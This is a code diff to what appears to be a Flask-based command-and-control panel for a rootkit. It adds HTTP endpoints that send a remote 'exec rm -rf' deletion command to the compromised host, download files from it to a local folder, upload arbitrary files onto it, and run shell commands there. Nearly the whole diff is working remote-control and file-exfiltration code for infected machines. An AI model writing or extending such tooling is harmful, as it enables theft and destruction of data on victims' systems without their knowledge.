@@ -5,7 +5,7 @@ from app import app
 import threading
 import time
 import re
-
+import os
 
 def handle_command(prefix, default_use_history, force_tcp=False):
     data = {}
@@ -81,6 +81,10 @@ def send():
 def exec_command():
     return handle_command("exec", True)
 
+@app.route('/delete-remote', methods=['POST'])
+def api_remove_file():
+    return handle_command("exec rm -rf", False, force_tcp=True)
+
 
 @app.route('/connect', methods=['POST'])
 def connect_command():
@@ -152,7 +156,6 @@ def sysinfo_command():
         return jsonify({'error': 'No client sysinfo available.'}), 404
     return jsonify(result), 200
 
-
 @app.route('/diskusage', methods=['GET'])
 def diskusage_command():
     return handle_command("exec df -h", False, force_tcp=True)
@@ -201,7 +204,7 @@ def cpu_ram_command():
 
     return response, status_code
 
-@app.route('/api/ls', methods=['GET'])
+@app.route('/ls', methods=['GET'])
 def api_list_remote_files():
     if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
         return jsonify({"error": "Not connected to any rootkit"}), 403
@@ -237,7 +240,7 @@ def api_list_remote_files():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/api/pwd', methods=['GET'])
+@app.route('/pwd', methods=['GET'])
 def api_get_current_directory():
     if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
         return jsonify({"error": "Not connected to any rootkit"}), 403
@@ -255,7 +258,7 @@ def api_get_current_directory():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/api/cd', methods=['POST'])
+@app.route('/cd', methods=['POST'])
 def api_change_directory():
     if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
         return jsonify({"error": "Not connected to any rootkit"}), 403
@@ -275,5 +278,114 @@ def api_change_directory():
 
         return jsonify({"path": new_path})
 
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/download-remote', methods=['POST'])
+def download_remote():
+    remote_path = request.json.get('remote_path')
+    if not remote_path:
+        return jsonify({"error": "Missing 'remote_path' in request"}), 400
+
+    if not os.path.isabs(remote_path):
+        return jsonify({"error": "Invalid remote path"}), 400
+
+    filename = os.path.basename(remote_path)
+    local_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)
+
+    try:
+        response = cfg.rootkit_connexion.send(f"download {remote_path}", use_history=False, channel="tcp")
+        if not response or not response.startswith("SIZE "):
+            return jsonify({"error": f"File unavailable or error: {response}"}), 400
+
+        size = int(response.split()[1])
+        data = cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")
+
+        if data is False or data is None:
+            return jsonify({"error": "Failed to receive file (missing data or network error)"}), 500
+
+        with open(local_path, "wb") as f:
+            f.write(data.encode("latin1") if isinstance(data, str) else data)
+
+        print(f"File downloaded successfully at {local_path}")
+        return jsonify({"message": f"File downloaded successfully: {filename}", "download_url": os.path.join(cfg.DOWNLOAD_FOLDER, filename)}), 200
+
+    except Exception as e:
+        return jsonify({"error": f"Error during download: {str(e)}"}), 500
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
+        return jsonify({"error": "Not connected to any rootkit"}), 403
+
+    if 'file' not in request.files:
+        return jsonify({"error": "No file part in the request"}), 400
+
+    file = request.files['file']
+    remote_path = request.form.get('remote_path')
+
+    if file.filename == '':
+        return jsonify({"error": "No selected file"}), 400
+
+    if not remote_path:
+        return jsonify({"error": "Missing 'remote_path' in request"}), 400
+
+    filename = file.filename
+    file_data = file.read()
+
+    try:
+        # Send the upload command to the rootkit
+        size = len(file_data)
+        command = f"upload {remote_path} {size}"
+        response = cfg.rootkit_connexion.send(command, use_history=False, channel="tcp")
+
+        if response is None:
+            return jsonify({"error": "No response from rootkit"}), 500
+
+        if response.strip().upper() != "READY":
+            return jsonify({"error": f"Rootkit refused upload: {response.strip()}"}), 400
+
+        # Send the binary file data
+        success = cfg.rootkit_connexion.send(file_data, use_history=False, channel="tcp")
+
+        if not success:
+            return jsonify({"error": "Failed to send file data"}), 500
+
+        if "successfully" in success.lower():
+            return jsonify({"message": "File uploaded successfully"}), 200
+        else:
+            return jsonify({"error": f"Unexpected response: {success}"}), 500
+
+    except Exception as e:
+        return jsonify({"error": f"Error during upload: {str(e)}"}), 500
+
+@app.route('/get_dowloaded_files', methods=['GET'])
+def get_downloaded_files():
+    if not os.path.exists(cfg.DOWNLOAD_FOLDER):
+        return jsonify({"error": "Download folder does not exist"}), 404
+
+    try:
+        files = os.listdir(cfg.DOWNLOAD_FOLDER)
+        files = [f for f in files if os.path.isfile(os.path.join(cfg.DOWNLOAD_FOLDER, f))]
+        return jsonify({"files": files}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/delete_downloaded_file', methods=['POST'])
+def delete_downloaded_file():
+    data = request.get_json()
+    filename = data.get('filename')
+
+    if not filename:
+        return jsonify({"error": "Filename is required"}), 400
+
+    file_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)
+
+    if not os.path.exists(file_path):
+        return jsonify({"error": "File does not exist"}), 404
+
+    try:
+        os.remove(file_path)
+        return jsonify({"message": f"File {filename} deleted successfully"}), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
